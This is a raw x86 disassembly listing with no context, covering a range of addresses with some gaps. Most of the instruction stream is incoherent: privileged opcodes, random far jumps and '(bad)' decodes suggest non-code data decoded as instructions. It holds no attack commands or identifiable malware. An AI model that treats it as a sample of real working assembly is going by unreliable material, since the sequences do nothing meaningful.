  42e182:	jle    0x42e1fd
  42e184:	cmp    esi,edi
  42e186:	outs   dx,BYTE PTR ds:[esi]
  42e187:	xor    ecx,DWORD PTR [esi+ecx*1+0x3d62a402]
  42e18e:	or     esi,esp
  42e190:	inc    edi
  42e191:	mov    ecx,0xdb5e2ff5
  42e196:	ret    
  42e197:	sub    ch,al
  42e199:	enter  0x3ef3,0x86
  42e19d:	dec    ebx
  42e19e:	into   
  42e19f:	lds    edx,FWORD PTR [ebx]
  42e1a1:	test   eax,0xa3fd40b0
  42e1a6:	mov    eax,ds:0x42930bdb
  42e1ab:	and    al,0x29
  42e1ad:	test   al,0x76
  42e1af:	pop    ds
  42e1b0:	aas    
  42e1b1:	das    
  42e1b2:	xchg   ebp,eax
  42e1b3:	or     BYTE PTR [ebx-0x28],ah
  42e1b6:	sbb    eax,0x8b67ccd4
  42e1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1bc:	das    
  42e1bd:	jmp    0x9d40:0xe76f649b
  42e1c4:	mov    bl,0x2b
  42e1c6:	lods   al,BYTE PTR ds:[esi]
  42e1c7:	or     dh,ah
  42e1c9:	rcr    DWORD PTR [ecx],0x38
  42e1cc:	cmp    DWORD PTR [ecx+eiz*2],ebx
  42e1cf:	push   edx
  42e1d0:	xchg   edx,eax
  42e1d1:	add    BYTE PTR [eax+0x5a4260c9],al
  42e1d7:	xchg   ebx,eax
  42e1d8:	adc    ebx,0x5
  42e1db:	test   eax,0xac63fbc6
  42e1e0:	sbb    ah,bh
  42e1e2:	xchg   ebx,eax
  42e1e3:	jo     0x42e1b5
  42e1e5:	mov    eax,ds:0x2bd39907
  42e1ea:	hlt    
  42e1eb:	mul    edi
  42e1ed:	dec    ebp
  42e1ee:	push   ds
  42e1ef:	push   eax
  42e1f0:	mov    bh,0xd1
  42e1f2:	(bad)  
  42e1f3:	mov    esi,0xc14e9295
  42e1f8:	into   
  42e1f9:	push   0xcbcddfca
  42e1fe:	rol    DWORD PTR [ebp-0x41c3e346],cl
  42e204:	js     0x42e27b
  42e206:	fldcw  WORD PTR [ebx+0x4d]
  42e209:	aaa    
  42e20a:	sbb    al,0x98
  42e20c:	popw   ds
  42e20e:	cmovne eax,DWORD PTR [esi+0x683b46ab]
  42e215:	cmp    DWORD PTR [edi-0x55da8ff9],ecx
  42e21b:	scas   al,BYTE PTR es:[edi]
  42e21c:	aas    
  42e21d:	daa    
  42e21e:	mov    edi,0xbfd10157
  42e223:	cmp    esi,edi
  42e225:	iret   
  42e226:	push   ebx
  42e227:	inc    ebx
  42e228:	mov    ds:0xd444c6ee,eax
  42e22d:	ja     0x42e274
  42e22f:	inc    ebp
  42e230:	and    BYTE PTR ds:0xa6e1d0,ch
	...
  42e296:	lods   eax,DWORD PTR ds:[esi]
  42e297:	cmp    eax,0xb79aa78a
  42e29c:	lods   eax,DWORD PTR ds:[esi]
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0x7089eaf2
  42e2a5:	fist   WORD PTR [ebp+0x70001ee]
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    BYTE PTR [edi-0x7a],ah
  42e2b0:	xchg   edx,eax
  42e2b1:	xchg   edi,eax
  42e2b2:	nop
  42e2b3:	push   eax
  42e2b4:	out    dx,eax
  42e2b5:	leave  
  42e2b6:	push   ecx
  42e2b7:	ror    esi,cl
  42e2b9:	push   ebp
  42e2ba:	dec    esp
  42e2bb:	cli    
  42e2bc:	cmp    eax,0xb2a9c765
  42e2c1:	jmp    0xaead:0x5497baf9
  42e2c8:	and    eax,0x8ab432aa
  42e2cd:	mov    edx,es
  42e2cf:	xchg   BYTE PTR [edi-0x5d],al
  42e2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2d3:	adc    al,0xb6
  42e2d5:	das    
  42e2d6:	test   al,0xa8
  42e2d8:	jae    0x42e2aa
  42e2da:	add    cl,BYTE PTR [ecx]
  42e2dc:	scas   al,BYTE PTR es:[edi]
  42e2dd:	add    BYTE PTR [edi+edi*4-0x6c],ch
  42e2e1:	sbb    al,0xdc
  42e2e3:	mov    ebx,0x47dc22c1
  42e2e8:	ins    BYTE PTR es:[edi],dx
  42e2e9:	mov    al,ds:0xfaf9b044
  42e2ee:	or     al,bh
  42e2f0:	pop    DWORD PTR [esi-0x475683c1]
  42e2f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e2f7:	mov    dl,0x42
  42e2f9:	sub    BYTE PTR [edi+ecx*1],dl
  42e2fc:	sbb    DWORD PTR [ecx+0x74],ebx
  42e2ff:	dec    ebx
  42e300:	sub    bl,BYTE PTR [edi+eax*8-0x212620d4]
  42e307:	mov    bl,0x7b
  42e309:	stc    
  42e30a:	pop    esp
  42e30b:	inc    esp
  42e30c:	imul   DWORD PTR [edx-0x2cacb5b8]
  42e312:	repnz xchg edi,eax
  42e314:	ins    DWORD PTR es:[edi],dx
  42e315:	xlat   BYTE PTR ds:[ebx]
  42e316:	fsub   st,st(1)
  42e318:	gs icebp 
  42e31a:	icebp  
  42e31b:	retf   0x86c7
  42e31e:	shl    ah,0x2
  42e321:	mov    ah,0xa2
  42e323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e324:	add    DWORD PTR [esi+0x8153934],ebp
  42e32a:	cwde   
  42e32b:	sub    ecx,ecx
  42e32d:	iret   
  42e32e:	(bad)  
  42e32f:	xor    eax,0x2cb17d2b
  42e334:	dec    ebp
  42e335:	imul   esp,ecx,0x4c7cdc17
  42e33b:	mov    ds:0xcd13a78d,eax
  42e340:	outs   dx,BYTE PTR ds:[esi]
  42e341:	xchg   edx,eax
  42e342:	inc    esi
  42e343:	mov    DWORD PTR [eax+0x33],0xc9e1e35f
  42e34a:	fs mov ebx,0xed8013ee
  42e350:	shr    ecx,0xb8
  42e353:	lds    esi,FWORD PTR [edi-0x35]
  42e356:	inc    edx
  42e357:	shl    BYTE PTR [ebx+0x9],cl
  42e35a:	scas   eax,DWORD PTR es:[edi]
  42e35b:	adc    BYTE PTR [edx],bh
  42e35d:	stc    
  42e35e:	add    edi,ebx
  42e360:	dec    edi
  42e361:	int    0x3f
  42e363:	retf   0xf2af
  42e366:	(bad)  
  42e367:	jo     0x42e3bd
  42e369:	push   eax
  42e36a:	inc    ecx
  42e36b:	icebp  
  42e36c:	sar    edx,1
  42e36e:	shr    DWORD PTR [edi],0x7
  42e371:	(bad)
  42e375:	mov    esp,0xf000433b
  42e37a:	icebp  
  42e37b:	loope  0x42e3fc
  42e37d:	je     0x42e383
  42e37f:	mov    ebx,fs
  42e381:	xchg   esp,eax
  42e382:	(bad)
  42e386:	jl     0x42e3a5
  42e388:	dec    ebp
  42e389:	adc    al,0xbb
  42e38b:	js     0x42e351
  42e38d:	in     eax,dx
  42e38e:	add    DWORD PTR [edx-0x4e],0x7df1416d
  42e395:	and    edx,DWORD PTR [eax]
  42e397:	mov    ebx,0xa8ac18fd
  42e39c:	mov    cl,0x9
  42e39e:	ficom  DWORD PTR [ebx]
  42e3a0:	adc    DWORD PTR [edi-0x32aa6f1a],0xfffffff5
  42e3a7:	adc    edx,DWORD PTR [edx]
  42e3a9:	lods   al,BYTE PTR ds:[esi]
  42e3aa:	mov    cl,0x3a
  42e3ac:	sbb    BYTE PTR [edx],ah
  42e3ae:	fmul   QWORD PTR [ebx-0x67]
  42e3b1:	sbb    esp,DWORD PTR ds:0xa9a1
	...
  42e413:	add    BYTE PTR [eax],al
  42e415:	add    dl,ah
  42e417:	mov    ebp,0xe7dfc7dc
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	ffreep st(0)
  42e424:	push   edi
  42e425:	(bad)  
  42e426:	pushf  
  42e427:	out    dx,eax
  42e428:	add    DWORD PTR [eax],eax
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    dh,ch
  42e42f:	out    0xa3,eax
  42e431:	mov    dh,0xae
  42e433:	jmp    0x18eb:0xad4bcad2
  42e43a:	inc    eax
  42e43b:	jge    0x42e481
  42e43d:	push   esi
  42e43e:	mov    edx,0x531fbe9d
  42e443:	xor    esi,DWORD PTR [ebx+0x50]
  42e446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e447:	aad    0xfc
  42e449:	inc    BYTE PTR [edi-0x42]
  42e44c:	mov    ah,0xa2
  42e44e:	idiv   BYTE PTR [ecx+esi*2+0xf]
  42e452:	and    DWORD PTR [ebp+esi*4-0x2ecc2eae],ecx
  42e459:	sbb    eax,0xe4773f75
  42e45e:	ss das 
  42e460:	jmp    0x42e4ab
  42e462:	mov    ebp,0xa35ef0e9
  42e467:	sub    eax,0x3b45503
  42e46c:	into   
  42e46d:	lea    edx,[edx+0x1f]
  42e470:	push   esi
  42e471:	inc    ebx
  42e472:	dec    edi
  42e473:	mov    WORD PTR [edi],fs
  42e475:	mov    DWORD PTR [edi-0x80],0x23dbcc3a
  42e47c:	xchg   esi,eax
  42e47d:	sti    
  42e47e:	xchg   edx,eax
  42e47f:	dec    esi
  42e480:	vpunpckldq ymm7,ymm6,YMMWORD PTR [edi+0x2f]
  42e485:	push   0x4d304a89
  42e48a:	pop    ss
  42e48b:	ins    BYTE PTR es:[edi],dx
  42e48c:	(bad)
  42e48f:	pop    ebp
  42e490:	xor    dh,BYTE PTR [eax]
  42e492:	sbb    edi,ecx
  42e494:	retf   
  42e495:	aas    
  42e496:	cdq    
  42e497:	dec    eax
  42e498:	pop    esi
  42e499:	imul   edi,DWORD PTR [ecx+0x1bf029b2],0xd77f17d7
  42e4a3:	mov    DWORD PTR [eax+ecx*8],edi
  42e4a6:	ja     0x42e4a4
  42e4a8:	and    edx,DWORD PTR [ebp+0x595af12d]
  42e4ae:	pop    eax
  42e4af:	sar    BYTE PTR [edx+0x179599b2],cl
  42e4b5:	popa   
  42e4b6:	mov    ebx,0xe18c34ff
  42e4bb:	sbb    BYTE PTR [eax],0xcb
  42e4be:	mov    dl,0xa4
  42e4c0:	pop    esp
  42e4c1:	or     eax,0xef0ebae3
  42e4c6:	add    eax,0x2deaf8a8
  42e4cb:	int    0xf8
  42e4cd:	lock mov eax,ds:0xc14198b9
  42e4d3:	xchg   esp,eax
  42e4d4:	mov    dh,dl
  42e4d6:	cdq    
  42e4d7:	ins    BYTE PTR es:[edi],dx
  42e4d8:	inc    esi
  42e4d9:	push   edi
  42e4da:	add    BYTE PTR [edi-0x7e],al
  42e4dd:	dec    ebp
  42e4de:	fs or  al,0x5
  42e4e1:	push   ds
  42e4e2:	or     BYTE PTR [esi+edi*4+0x7bfa3545],al
  42e4e9:	jl     0x42e4c2
  42e4eb:	mov    edx,0x8078b42a
  42e4f0:	sub    bl,BYTE PTR [eax+edx*1]
  42e4f3:	xchg   ebp,eax
  42e4f4:	add    ecx,DWORD PTR ds:0xebb6daee
  42e4fa:	fisubr DWORD PTR [edi-0x3a]
  42e4fd:	rol    BYTE PTR [edx-0x71ee4f12],1
  42e503:	fnstenv [edx]
  42e505:	int    0x10
  42e507:	pop    ds
  42e508:	(bad)
  42e50b:	retf   
  42e50c:	cld    
  42e50d:	pop    ecx
  42e50e:	js     0x42e566
  42e510:	ficom  DWORD PTR [edx+0x49]
  42e513:	cli    
  42e514:	ret    
  42e515:	retf   
  42e516:	fistp  WORD PTR [ebx-0x58c231c4]
  42e51c:	xchg   esp,eax
  42e51d:	cmp    al,0x2b
  42e51f:	pop    es
  42e520:	fld    QWORD PTR [eax+edi*1+0x52071b3f]
  42e527:	imul   edi,DWORD PTR [ecx+0x54],0xffffffa5
  42e52b:	(bad)  
  42e52d:	arpl   bx,cx
  42e52f:	or     DWORD PTR [esp+ecx*4+0x60b72e],ecx
	...
  42e596:	push   ebp
  42e597:	cmp    dh,cl
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	pusha  
  42e5a3:	cs aaa 
  42e5a5:	pop    ecx
  42e5a6:	mov    ds:0x70001f0,eax
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    BYTE PTR [ebx+eiz*4-0x407b0f41],ch
  42e5b4:	mov    al,ds:0x666ac67c
  42e5b9:	sbb    al,0x76
  42e5bb:	test   BYTE PTR [esi],al
  42e5bd:	dec    ebx
  42e5be:	ja     0x42e5f5
  42e5c0:	retf   
  42e5c1:	mov    edx,0x771f0a22
  42e5c6:	sub    BYTE PTR [eax],cl
  42e5c8:	and    BYTE PTR [esp+eax*4+0x26],0x23
  42e5cd:	sub    al,0x3f
  42e5cf:	xlat   BYTE PTR ds:[ebx]
  42e5d0:	pusha  
  42e5d1:	outs   dx,DWORD PTR ds:[esi]
  42e5d2:	xchg   edx,eax
  42e5d3:	fs pop ss
  42e5d5:	jmp    0xfb46:0x898323c9
  42e5dc:	mov    ah,0xb
  42e5de:	pop    es
  42e5df:	xchg   edx,eax
  42e5e0:	adc    eax,0x74050f9d
  42e5e5:	sub    al,0x84
  42e5e7:	mov    BYTE PTR [eax+esi*4+0x7b9ca7a0],al
  42e5ee:	aas    
  42e5ef:	clc    
  42e5f0:	xchg   esi,eax
  42e5f1:	cmp    eax,0xdb7a2471
  42e5f6:	cmp    eax,0xc492996a
  42e5fb:	aas    
  42e5fc:	fs cwde 
  42e5fe:	icebp  
  42e5ff:	clc    
  42e600:	xchg   ebp,eax
  42e601:	mov    cl,0xd6
  42e603:	and    ch,BYTE PTR [ebx-0x3d6447f7]
  42e609:	xor    al,0x8f
  42e60b:	xchg   ebx,eax
  42e60c:	xlat   BYTE PTR ds:[ebx]
  42e60d:	sbb    esp,DWORD PTR [eax]
  42e60f:	out    0xd1,eax
  42e611:	jne    0x42e67c
  42e613:	mov    DWORD PTR [edx],esi
  42e615:	push   ebx
  42e616:	ins    BYTE PTR es:[edi],dx
  42e617:	push   0xb6827096
  42e61c:	pop    ds
  42e61d:	adc    eax,0xfa3d89aa
  42e622:	icebp  
  42e623:	lock cwde 
  42e625:	les    ebx,FWORD PTR [ecx-0x1d]
  42e628:	xchg   ebp,eax
  42e629:	mov    bh,0x42
  42e62b:	pop    esi
  42e62c:	je     0x42e5b3
  42e62e:	sbb    ebx,DWORD PTR [edx+0x4b94eea3]
  42e634:	(bad)  
  42e635:	retf   0x7d6f
  42e638:	xchg   ebx,eax
  42e639:	scas   al,BYTE PTR es:[edi]
  42e63a:	mov    es,WORD PTR [esi+ebx*2-0x17]
  42e63e:	pop    edx
  42e63f:	call   0x2f74:0xcb1ac812
  42e646:	call   0x196c:0xcfb3190d
  42e64d:	dec    ebx
  42e64e:	dec    edi
  42e64f:	push   esi
  42e650:	cmp    ebx,DWORD PTR [ebx+ebx*2]
  42e653:	scas   al,BYTE PTR es:[edi]
  42e654:	stos   DWORD PTR es:[edi],eax
  42e655:	mov    ah,0x37
  42e657:	xchg   edx,eax
  42e658:	rcl    DWORD PTR [esi],0x64
  42e65b:	int    0xcb
  42e65d:	cld    
  42e65e:	mov    edx,0x72bdcdf5
  42e663:	out    0x39,eax
  42e665:	cmp    eax,0x37289b37
  42e66a:	loope  0x42e64c
  42e66c:	push   esi
  42e66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e66e:	mov    esi,0xad5935e1
  42e673:	lods   eax,DWORD PTR ds:[esi]
  42e674:	test   BYTE PTR [eax-0x1fc6454e],cl
  42e67a:	fcomip st,st(1)
  42e67c:	xchg   DWORD PTR [ebp+0x270e7c91],ebx
  42e682:	or     DWORD PTR [ecx-0x6905fd51],esp
  42e688:	xchg   esi,eax
  42e689:	cmp    eax,ebp
  42e68b:	aad    0x94
  42e68d:	push   edi
  42e68e:	mov    ch,0xf
  42e690:	ret    
  42e691:	hlt    
  42e692:	dec    esi
  42e693:	xlat   BYTE PTR ds:[ebx]
  42e694:	(bad)  
  42e695:	cmp    ebp,DWORD PTR [ecx-0x12]
  42e698:	ja     0x42e64f
  42e69a:	stc    
  42e69b:	popa   
  42e69c:	mov    ebp,0xf2a3146b
  42e6a1:	shl    DWORD PTR [esi+0x6c],cl
  42e6a4:	stc    
  42e6a5:	fdiv   QWORD PTR [edi-0x2b]
  42e6a8:	int3   
  42e6a9:	push   esp
  42e6aa:	add    eax,0xb1ac52dc
  42e6af:	sub    al,0x96
  42e6b1:	outs   dx,DWORD PTR ds:[esi]
  42e6b2:	or     edi,DWORD PTR [edx+ebp*1+0x0]
	...
  42e716:	pop    edx
  42e717:	cmp    DWORD PTR [esi+0x2d],ecx
  42e71a:	outs   dx,DWORD PTR ds:[esi]
  42e71b:	jg     0x42e798
  42e71d:	jg     0x42e6cd
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	retf   
  42e723:	ror    DWORD PTR [esi+edi*4-0x56],1
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [edx-0x47],bh
  42e730:	jnp    0x42e6e0
  42e732:	or     eax,0xf6e64251
  42e737:	mov    fs,WORD PTR [eax-0x1d2189cc]
  42e73d:	and    al,0xe9
  42e73f:	jmp    0x42e765
  42e741:	loopne 0x42e793
  42e743:	mov    BYTE PTR [edx-0x14],bl
  42e746:	pusha  
  42e747:	fwait
  42e748:	or     dl,BYTE PTR [esi-0x500a43f5]
  42e74e:	adc    ebx,DWORD PTR ds:0x51e1ccf8
  42e754:	xor    al,0x12
  42e756:	lea    ebx,[edx]
  42e758:	mov    al,ds:0x14c3aefe
  42e75d:	dec    esi
  42e75e:	xlat   BYTE PTR ds:[ebx]
  42e75f:	aam    0x7d
  42e761:	shufps xmm7,XMMWORD PTR [ebp-0x2b],0x6a
  42e766:	popf   
  42e767:	mov    edx,DWORD PTR [ebx]
  42e769:	popf   
  42e76a:	je     0x42e778
  42e76c:	sti    
  42e76d:	inc    esp
  42e76e:	and    DWORD PTR [ebp-0x6b3185af],ebx
  42e774:	arpl   bp,sp
  42e776:	push   cs
  42e777:	mov    ch,0x4
  42e779:	loopne 0x42e778
  42e77b:	enter  0xc48e,0x31
  42e77f:	sahf   
  42e780:	or     dh,cl
  42e782:	dec    edx
  42e783:	jl     0x42e7bc
  42e785:	cmp    DWORD PTR [ecx+0x4f],0x7e
  42e789:	push   0xff56520a
  42e78e:	rcr    BYTE PTR [eax+0x7c66418f],cl
  42e794:	jle    0x42e7d3
  42e796:	mov    bh,0x1
  42e798:	adc    al,0xe0
  42e79a:	push   es
  42e79b:	fiadd  WORD PTR [edx-0x40110094]
  42e7a1:	call   0xbaa4:0x5f8ce581
  42e7a8:	(bad)  
  42e7a9:	int3   
  42e7aa:	and    eax,0x5ca4302f
  42e7af:	aad    0xe4
  42e7b1:	lock in al,0x41
  42e7b4:	sbb    ch,BYTE PTR [eax+eiz*4]
  42e7b7:	cmc    
  42e7b8:	retf   0x706
  42e7bb:	mov    DWORD PTR [ebx-0x29361198],esp
  42e7c1:	jp     0x42e743
  42e7c3:	into   
  42e7c4:	push   0xb9370c5e
  42e7c9:	mov    BYTE PTR [eax-0x52],dh
  42e7cc:	pop    ds
  42e7cd:	push   edi
  42e7ce:	aas    
  42e7cf:	nop
  42e7d0:	stos   DWORD PTR es:[edi],eax
  42e7d1:	jmp    0x2f17:0x83a6c70
  42e7d8:	mov    eax,0xfe2d2d0f
  42e7dd:	push   es
  42e7de:	xor    eax,DWORD PTR [ecx]
  42e7e0:	fs pop edx
  42e7e2:	test   al,0xc9
  42e7e4:	outs   dx,BYTE PTR ds:[esi]
  42e7e5:	or     bl,BYTE PTR [edi+0x3]
  42e7e8:	xchg   esi,eax
  42e7e9:	mov    bh,0x63
  42e7eb:	test   eax,0x879d8b00
  42e7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7f1:	popf   
  42e7f2:	cmc    
  42e7f3:	cwde   
  42e7f4:	add    edi,ecx
  42e7f6:	and    ebx,esi
  42e7f8:	xchg   DWORD PTR [edi],ebx
  42e7fa:	jns    0x42e807
  42e7fc:	push   ss
  42e7fd:	xchg   ebp,ebp
  42e7ff:	sbb    al,0x3f
  42e801:	repnz add BYTE PTR [edx-0x6de8335b],ch
  42e808:	mov    ds:0x4dc8539a,eax
  42e80d:	jmp    0x42e881
  42e80f:	adc    ch,BYTE PTR [ebx]
  42e811:	jns    0x42e7af
  42e813:	arpl   bp,di
  42e815:	ins    BYTE PTR es:[edi],dx
  42e816:	(bad)  
  42e817:	leave  
  42e818:	push   0x674211e
  42e81d:	ss mov ?,edx
  42e820:	inc    esp
  42e821:	in     al,dx
  42e822:	jmp    0xc13412a7
  42e827:	leave  
  42e828:	pop    ds
  42e829:	or     DWORD PTR [ebx],ebx
  42e82b:	mov    eax,0x866de713
  42e830:	push   0x251ec6df
	...
  42e895:	add    bl,al
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp-0x1b90ec3d]
  42e8a3:	nop
  42e8a4:	ds dec edi
  42e8a6:	mov    cl,0xf2
  42e8a8:	add    DWORD PTR [eax],eax
  42e8aa:	pop    es
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    BYTE PTR [ebx+0x35],dl
  42e8b0:	push   ds
  42e8b1:	test   BYTE PTR [edi+0x35],0x5d
  42e8b5:	fild   QWORD PTR [eax]
  42e8b7:	jl     0x42e8d0
  42e8b9:	fwait
  42e8ba:	and    DWORD PTR [eax+0x10],edi
  42e8bd:	sub    BYTE PTR [eax+0x3c71cf5c],ch
  42e8c3:	xchg   esp,eax
  42e8c4:	(bad)  
  42e8c5:	fmul   st(7),st
  42e8c7:	inc    esp
  42e8c8:	cmp    ebx,DWORD PTR [eax]
  42e8ca:	and    DWORD PTR [edx+esi*8-0x55],esp
  42e8ce:	or     DWORD PTR [esi+0x2b],esi
  42e8d1:	pusha  
  42e8d2:	xchg   edi,eax
  42e8d3:	dec    esp
  42e8d4:	add    cl,bl
  42e8d6:	neg    BYTE PTR [ebx]
  42e8d8:	lea    ebx,[edx-0x1f84e72f]
  42e8de:	aas    
  42e8df:	jmp    0x5486:0x29c1d97
  42e8e6:	or     eax,0x24d7c7d5
  42e8eb:	ins    BYTE PTR es:[edi],dx
  42e8ec:	es inc esi
  42e8ee:	repz lahf 
  42e8f0:	and    eax,0x477c965b
  42e8f5:	pushf  
  42e8f6:	fdivr  QWORD PTR [eax]
  42e8f8:	xchg   DWORD PTR [edx+0xf],edx
  42e8fb:	pop    ebp
  42e8fc:	das    
  42e8fd:	cli    
  42e8fe:	idiv   BYTE PTR [eax-0x29]
  42e901:	fisttp WORD PTR [ebp*1-0x11c22d39]
  42e908:	or     edx,esp
  42e90a:	cmp    ebp,DWORD PTR [eax+0x0]
  42e90d:	ins    DWORD PTR es:[edi],dx
  42e90e:	data16 jl 0x42e946
  42e911:	push   edx
  42e912:	fidiv  DWORD PTR [ebp-0x3d858749]
  42e918:	mov    bh,0xe4
  42e91a:	add    al,0xa3
  42e91c:	(bad)  
  42e91e:	fistp  DWORD PTR [edx]
  42e920:	int3   
  42e921:	cmp    BYTE PTR [esi],al
  42e923:	xor    al,0x3b
  42e925:	or     BYTE PTR [edx+0x4dbb7cd9],dh
  42e92b:	push   esp
  42e92c:	jecxz  0x42e9aa
  42e92e:	add    eax,DWORD PTR [edi]
  42e930:	loopne 0x42e8f9
  42e932:	in     eax,0x62
  42e934:	aaa    
  42e935:	or     eax,0xcc5fcf27
  42e93a:	or     ecx,edx
  42e93c:	fld    QWORD PTR [ebx+eax*2-0x5e]
  42e940:	push   0xfffffff0
  42e942:	sbb    al,0xa6
  42e944:	mov    ?,WORD PTR [ebp-0x8]
  42e947:	push   esp
  42e948:	mov    ecx,edi
  42e94a:	popf   
  42e94b:	test   dh,al
  42e94d:	pop    edi
  42e94e:	lods   al,BYTE PTR ds:[esi]
  42e94f:	sbb    DWORD PTR [edx+ecx*8],ebx
  42e952:	sub    eax,0x309760e
  42e957:	mov    BYTE PTR ds:0x6386b72e,ah
  42e95d:	data16 mov dl,0xc6
  42e960:	lods   eax,DWORD PTR ds:[esi]
  42e961:	fistp  DWORD PTR [ecx]
  42e963:	mov    ds:0x130d8433,al
  42e968:	jne    0x42e98f
  42e96a:	sub    ch,BYTE PTR [ebx+0x275b4196]
  42e970:	lss    eax,FWORD PTR [eax]
  42e973:	ss lock xchg edx,eax
  42e976:	push   0x28
  42e978:	pop    edx
  42e979:	repz mov eax,0x45484fc1
  42e97f:	lock scas al,BYTE PTR es:[edi]
  42e981:	jge    0x42e97d
  42e983:	cmp    DWORD PTR [ecx-0x5060195e],ebx
  42e989:	stos   BYTE PTR es:[edi],al
  42e98a:	ds mov ch,0xc7
  42e98d:	call   0x7a3ae443
  42e992:	mov    al,ds:0x13faa4a8
  42e997:	fsub   DWORD PTR [ecx-0x1b1b8e0f]
  42e99d:	push   esp
  42e99e:	sub    al,0x4c
  42e9a0:	sar    BYTE PTR [eax],0x48
  42e9a3:	mov    ch,0x8b
  42e9a5:	mov    dh,0x97
  42e9a7:	jne    0x42e99f
  42e9a9:	mov    ds:0x8ae1a75e,al
  42e9ae:	(bad)  
  42e9af:	mov    ebx,0x21efabbc
  42e9b4:	sbb    eax,DWORD PTR [eax]
	...
  42ea16:	in     eax,0xba
  42ea18:	xchg   edx,eax
  42ea19:	jecxz  0x42e9fa
  42ea1b:	jmp    0x42ea12
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	xor    DWORD PTR [esi],eax
  42ea24:	jge    0x42ea6d
  42ea26:	mov    eax,0x70001f3
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR [esi-0x32d46763],bl
  42ea33:	mov    ebp,0x18b9d228
  42ea38:	jecxz  0x42ea95
  42ea3a:	inc    eax
  42ea3b:	mov    edi,0xa97ba998
  42ea40:	scas   al,BYTE PTR es:[edi]
  42ea41:	sbb    al,0x80
  42ea43:	es xor dl,dl
  42ea46:	out    dx,al
  42ea47:	jno    0x42ea3c
  42ea49:	lds    eax,FWORD PTR [edi+esi*1-0x36c01e02]
  42ea50:	int    0x9
  42ea52:	jbe    0x42ea60
  42ea54:	popf   
  42ea55:	dec    edx
  42ea56:	or     bh,0x3f
  42ea59:	leave  
  42ea5a:	repnz push ss
  42ea5c:	pop    ds
  42ea5d:	stos   BYTE PTR es:[edi],al
  42ea5e:	pop    esp
  42ea5f:	aaa    
  42ea60:	mov    ah,BYTE PTR [ebx]
  42ea62:	xor    ebx,DWORD PTR [edx+0x59cdeda6]
  42ea68:	pop    eax
  42ea69:	jo     0x42ea1c
  42ea6b:	adc    DWORD PTR [ecx],0xebd76f6b
  42ea71:	repnz xchg ebp,eax
  42ea73:	int    0xea
  42ea75:	pusha  
  42ea76:	push   0x9cbb3309
  42ea7b:	push   es
  42ea7c:	popf   
  42ea7d:	ret    
  42ea7e:	fdiv   DWORD PTR [edi-0x31948173]
  42ea84:	mov    ds:0xa46379ce,al
  42ea89:	push   esi
  42ea8a:	call   0x32bd:0xd974861d
  42ea91:	in     eax,dx
  42ea92:	mov    edx,0xa7534081
  42ea97:	bound  ebp,QWORD PTR [edx]
  42ea99:	and    edx,edi
  42ea9b:	push   ecx
  42ea9c:	test   DWORD PTR [eax+ebx*8-0x3ad9976f],edx
  42eaa3:	iret   
  42eaa4:	int    0x75
  42eaa6:	test   eax,0xe850868f
  42eaab:	pop    ds
  42eaac:	add    cl,BYTE PTR [ebx]
  42eaae:	mov    esp,0x96ed32ae
  42eab3:	into   
  42eab4:	xchg   BYTE PTR [ebx+0x42f89e51],ch
  42eaba:	and    ah,ch
  42eabc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eabd:	sub    bh,BYTE PTR [edi+0x9]
  42eac0:	cdq    
  42eac1:	popf   
  42eac2:	mov    edi,0xa2db6500
  42eac7:	fld    QWORD PTR [eax+0x24de7082]
  42eacd:	cmp    eax,0x9eaa88e1
  42ead2:	sbb    al,BYTE PTR [esp+ebp*4-0x7f]
  42ead6:	inc    esi
  42ead7:	sub    eax,ebx
  42ead9:	cs repz jmp FWORD PTR gs:[ebx-0x4a]
  42eadf:	cwde   
  42eae0:	inc    eax
  42eae1:	pop    ss
  42eae2:	push   edx
  42eae3:	(bad)  
  42eae4:	jmp    0x56bdc0d0
  42eae9:	call   0x499bd43e
  42eaee:	dec    ebp
  42eaef:	in     eax,dx
  42eaf0:	dec    ebx
  42eaf1:	or     BYTE PTR [ecx],dl
  42eaf3:	mov    edx,0x3f51927c
  42eaf8:	add    BYTE PTR [edi],dh
  42eafa:	fst    QWORD PTR [edi+0x75]
  42eafd:	(bad)  
  42eafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eaff:	shl    DWORD PTR [edi+ebx*2],cl
  42eb02:	sub    ch,BYTE PTR [edx+ebx*2-0x52]
  42eb06:	fcmovne st,st(0)
  42eb08:	sub    esp,DWORD PTR [edi-0x68]
  42eb0b:	jp     0x42eab5
  42eb0d:	push   esp
  42eb0e:	out    0x93,al
  42eb10:	aas    
  42eb11:	push   esp
  42eb12:	cmp    DWORD PTR [ebx+0x17],esi
  42eb15:	int3   
  42eb16:	sbb    al,0x82
  42eb18:	cli    
  42eb19:	in     eax,dx
  42eb1a:	pusha  
  42eb1b:	inc    ebx
  42eb1c:	loope  0x42eaaa
  42eb1e:	dec    ebx
  42eb1f:	aaa    
  42eb20:	push   ecx
  42eb21:	cdq    
  42eb22:	mov    edi,DWORD PTR [edi]
  42eb24:	dec    DWORD PTR [ebx-0x35]
  42eb27:	xchg   esp,eax
  42eb28:	ds sti 
